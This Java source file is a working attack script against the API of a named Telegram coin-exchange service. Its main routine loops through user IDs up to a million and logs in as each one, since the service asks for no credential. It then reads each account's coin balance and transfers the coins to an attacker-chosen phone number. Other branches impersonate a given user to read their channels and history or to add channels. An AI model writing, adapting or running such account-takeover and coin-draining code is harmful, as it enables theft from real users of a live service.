import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.util.EntityUtils;

import java.util.Scanner;
import java.util.StringTokenizer;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Created by HellScre4m on 5/18/2016.
 */
public class Test
{
	public static void main (String[] args) throws Exception
	{
//		HttpClient client = new DefaultHttpClient();
		String content = "";
		Scanner in = new Scanner(System.in);
		int choice = in.nextInt();
		HttpClient client = HttpClientBuilder.create().build();
		HttpUriRequest req;
		HttpResponse response;
		HttpEntity entity;
		switch (choice)
		{
			case 1:
				int i = in.nextInt();
				String phone = in.next();
				for (; i < 1000000; i++)
				{
					try
					{
						String query = "http://appmy-cafemember.ir/api/tg/user/login/" + i;
						req = new HttpPost(query);
						response = client.execute(req);
						entity = response.getEntity();
						content = EntityUtils.toString(entity);
						String token = "";
						if (response.getStatusLine().getStatusCode() == 200)
						{
							StringTokenizer tk = new StringTokenizer(content, "\"*\"");
							while (tk.hasMoreTokens())
							{
								String t = tk.nextToken();
								if (t.equals("token"))
								{
									tk.nextToken();
									token = tk.nextToken();
									break;
								}
								
							}
						}
//				System.out.println(token);
						req = new HttpGet("http://appmy-cafemember.ir/api/tg/coin?token=" + token);
						response = client.execute(req);
						entity = response.getEntity();
						content = EntityUtils.toString(entity);
						
						int coins = 0;
						if (response.getStatusLine().getStatusCode() == 200)
						{
							StringTokenizer tk = new StringTokenizer(content, "\"*\"");
							while (tk.hasMoreTokens())
							{
								String t = tk.nextToken();
								if (t.equals("joinCoins"))
								{

//							String t2 = tk.nextToken();
									String t3 = tk.nextToken("*");
//							System.out.println(t3);
									Pattern pattern = Pattern.compile("[\\d]+");
									Matcher match = pattern.matcher(t3);
									match.find();
									String t4 = match.group();
//							System.out.println(t4);
//							System.out.println(tk.nextToken());
									try
									{
										coins += Integer.parseInt(t4);
									}
									catch (NumberFormatException e)
									{
										System.out.println(t4);
										return;
//								coins += Integer.parseInt(t2.substring(1, t2.length() - 1));
									}
//							tk.nextToken();
//							tk.nextToken();
//							tk.nextToken();

//							try
//							{
									match.find();
									t4 = match.group();
//							System.out.println(t4);
									coins += Integer.parseInt(t4);
//							}
//							catch (NumberFormatException e)
//							{
//								tk.nextToken();
//								coins += Integer.parseInt(tk.nextToken());
//							}
									break;
								}
								
							}
						}
						
						req = new HttpPost("http://appmy-cafemember.ir/api/tg/coin/transfare/1/" + phone + "/" + coins +
								                   "?token=" +
								                   token);
						response = client.execute(req);
						entity = response.getEntity();
						content = EntityUtils.toString(entity);
						if (response.getStatusLine().getStatusCode() == 200)
						{
							if (!content.contains("HTML"))
							{
								System.out.println("Transferred " + coins + " from " + i);
							}
						}
						else
						{
							System.err.println(i-- + ": " + content);
							continue;
						}
						
					}
					
					catch (Exception e)
					{
						e.printStackTrace();
						System.err.println(i--);
						continue;
					}
				}
				break;
			case 2:
				String id = in.next();
				while (true)
				{
					try
					{
						String query = "http://appmy-cafemember.ir/api/tg/user/login/" + id;
						req = new HttpPost(query);
//					req.addHeader("content-type", "application/json");
						response = client.execute(req);
						entity = response.getEntity();
						content = EntityUtils.toString(entity);
						String token = "";
						if (!content.contains("error"))
						{
							continue;
						}
						if (response.getStatusLine().getStatusCode() == 200)
						{
							StringTokenizer tk = new StringTokenizer(content, "\"*\"");
							while (tk.hasMoreTokens())
							{
								String t = tk.nextToken();
								if (t.equals("token"))
								{
									tk.nextToken();
									token = tk.nextToken();
									break;
								}
								
							}
						}
						else
						{
							System.out.println("error");
							
						}
//					System.out.println(token);
						req = new HttpGet("http://appmy-cafemember.ir/api/tg/channels/getMy?token=" + token);
						entity = response.getEntity();
						content = EntityUtils.toString(entity);
						if (content.equals(""))
						{
							continue;
						}
						System.out.println(content);
						break;
					}
					catch (Exception e)
					{
						e.printStackTrace();
					}
					
					
				}
				break;
			case 4:
				id = in.next();
				int channelID = in.nextInt();
				String name = in.next();
				int number = in.nextInt();
				while (true)
				{
					try
					{
						String query = "http://appmy-cafemember.ir/api/tg/user/login/" + id;
						req = new HttpPost(query);
//					req.addHeader("content-type", "application/json");
						response = client.execute(req);
						entity = response.getEntity();
						content = EntityUtils.toString(entity);
						String token = "";
						if (!content.contains("error"))
						{
							continue;
						}
						if (response.getStatusLine().getStatusCode() == 200)
						{
							StringTokenizer tk = new StringTokenizer(content, "\"*\"");
							while (tk.hasMoreTokens())
							{
								String t = tk.nextToken();
								if (t.equals("token"))
								{
									tk.nextToken();
									token = tk.nextToken();
									break;
								}
								
							}
						}
						else
						{
							System.out.println("error");
							
						}
//					System.out.println(token);
						req = new HttpPost("http://appmy-cafemember.ir/api/tg/channels/add/" + channelID + "/"
								                   + name + "/" + number + "?token=" +
								                   token);
						entity = response.getEntity();
						content = EntityUtils.toString(entity);
						if (content.equals(""))
						{
							continue;
						}
						System.out.println(content);
						break;
					}
					catch (Exception e)
					{
						e.printStackTrace();
					}
					
				}
				break;
			case 3:
				id = in.next();
				while (true)
				{
					try
					{
						String query = "http://appmy-cafemember.ir/api/tg/user/login/" + id;
						req = new HttpPost(query);
//					req.addHeader("content-type", "application/json");
						response = client.execute(req);
						entity = response.getEntity();
						content = EntityUtils.toString(entity);
						String token = "";
						if (!content.contains("error"))
						{
							continue;
						}
						if (response.getStatusLine().getStatusCode() == 200)
						{
							StringTokenizer tk = new StringTokenizer(content, "\"*\"");
							while (tk.hasMoreTokens())
							{
								String t = tk.nextToken();
								if (t.equals("token"))
								{
									tk.nextToken();
									token = tk.nextToken();
									break;
								}
								
							}
						}
						else
						{
							System.out.println("error");
							
						}
//					System.out.println(token);
						req = new HttpGet("http://appmy-cafemember.ir/api/tg/user/history?token=" + token);
						entity = response.getEntity();
						content = EntityUtils.toString(entity);
						if (content.equals(""))
						{
							continue;
						}
						System.out.println(content);
						break;
					}
					catch (Exception e)
					{
						e.printStackTrace();
					}
					
				}
		}
	}
	
	
}
